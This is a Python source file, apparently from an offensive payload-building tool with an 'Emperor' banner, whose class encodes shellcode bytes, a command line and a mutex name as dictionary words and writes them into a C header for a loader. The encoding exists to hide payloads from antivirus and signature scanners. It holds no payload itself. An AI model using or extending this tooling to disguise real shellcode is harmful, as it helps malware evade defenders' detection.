# ___________
# \_   _____/ _____ ______   ___________  ___________ 
#  |    __)_ /     \\____ \_/ __ \_  __ \/  _ \_  __ \
#  |        \  Y Y  \  |_> >  ___/|  | \(  <_> )  | \/
# /_______  /__|_|  /   __/ \___  >__|   \____/|__|   
#         \/      \/|__|        \/                    
#                         _.._
#                      .-'    `-.                
#                     :          ;               
#                     ; ,_    _, ;               
#                     : \{"  "}/ :               
#                    ,'.'"=..=''.'.              
#                   ; / \      / \ ;             
#                 .' ;   '.__.'   ; '.           
#              .-' .'              '. '-.        
#            .'   ;                  ;   '.      
#           /    /                    \    \     
#          ;    ;                      ;    ;    
#          ;   `-._                  _.-'   ;    
#           ;      ""--.        .--""      ;     
#            '.    _    ;      ;    _    .'      
#            {""..' '._.-.    .-._.' '..""}      
#             \           ;  ;           /       
#              :         :    :         :        
#              :         :.__.:         :        
#               \       /"-..-"\       /      
#                '-.__.'        '.__.-'          

# diciontary encoder class that can be used to encode shellcode as dictionary words
class dict_encoder:

    
    # constructor for the class, initializes with a dictionary file path
    # and then initializes the dictionary stored within
    def __init__(self, dict_file_path):

        dict_file    = open(dict_file_path, "r")

        # initializes the dictionary to store our wordlist
        self.enc_dict = dict()

        # loops through each word in the wordlist. gets the index of the word,
        # and the word itself with the enumerate function
        for idx, word in enumerate(dict_file):
            # added the .strip() to remove the newline character
            self.enc_dict[idx] = word.strip()

    def encode_payload(self, payload_buf, outfile_path = "..\\src-common\\buf.h"):

        # initializes an encoded payload
        enc_payload = []

        # stores the data size. this will be needed for the constants in c
        data_size   = len(payload_buf)

        # now that we have our dictionary loaded. we want to loop through each byte
        # of the payload buffer and get the corresponding word
        for byte in payload_buf:

            # appends the corresponding word to the encoded payload list
            enc_payload.append(self.enc_dict[byte])

        # opens file buf.h for writing
        outfile = open(outfile_path, "w")

        # writes the pragma once definition to the top of the file
        outfile.write("#pragma once\n\n")

        # writes the data size constant to the file
        outfile.write("// writes the data size constant to the file\n")
        outfile.write("#define DATA_SIZE " + str(data_size) + "\n\n")

        # writes the dictionary
        outfile.write("// dictionary for payload decoding\n")
        outfile.write("const char* dict[] = {")
        for dict_word in self.enc_dict.values():
            outfile.write('"' + dict_word + '",\n')
        outfile.write(" };\n\n")

        # writes the encoded payload
        outfile.write("// dictionary encoded payload\n")
        outfile.write("const char* buf[] = {")
        for enc_byte in enc_payload:
            outfile.write('"' + enc_byte + '",\n')
        outfile.write(" };\n\n")        

        outfile.close()

    def encode_cmd_line(self, cmd_line_file_path, outfile_path = "..\\src-common\\buf.h"):

        # defines an encoded command line list
        enc_cmd_line = []

        # loads the file for reading
        cmd_file = open(cmd_line_file_path)
        # reads the values and stores them as bytes
        cmd_line = cmd_file.read().encode('utf-8')

        # for each byte in our command line, encodes and appends to our list
        for byte in cmd_line:
            enc_cmd_line.append(self.enc_dict[byte])

        # null terminate our string
        enc_cmd_line.append(self.enc_dict[0])

        # closes the file now that we're done
        cmd_file.close()

        # opens file buf.h for writing
        outfile = open(outfile_path, "a")

        # writes the size of the command line
        outfile.write("// size of the command line arg\n")
        outfile.write("#define CMD_LINE_SIZE ")
        outfile.write(str(len(enc_cmd_line)))
        outfile.write("\n\n")

        # writes the encoded command line
        outfile.write("// dictionary encoded command line\n")
        outfile.write("const char* cmd[] = {")
        for enc_byte in enc_cmd_line:
            outfile.write('"' + enc_byte + '",\n')
        outfile.write(" };\n\n")

        outfile.close()

    def encode_mutex(self, mutex_name, outfile_path = "..\\src-common\\buf.h"):
        # defines an encoded mutex list
        enc_mutex = []

        # loads the file for reading
        mutex_name_bytes = mutex_name.encode('utf-8')

        # for each byte in our mutex name, encodes and appends to our list
        for byte in mutex_name_bytes:
            enc_mutex.append(self.enc_dict[byte])

        # null terminate our string
        enc_mutex.append(self.enc_dict[0])

        # opens file buf.h for writing
        outfile = open(outfile_path, "a")

        # writes the size of the command line
        outfile.write("// size of the command line arg\n")
        outfile.write("#define MUTEX_NAME_SIZE ")
        outfile.write(str(len(enc_mutex)))
        outfile.write("\n\n")

        # writes the encoded command line
        outfile.write("// dictionary encoded command line\n")
        outfile.write("const char* mutex_enc[] = {")
        for enc_byte in enc_mutex:
            outfile.write('"' + enc_byte + '",\n')
        outfile.write(" };\n\n")

        outfile.close()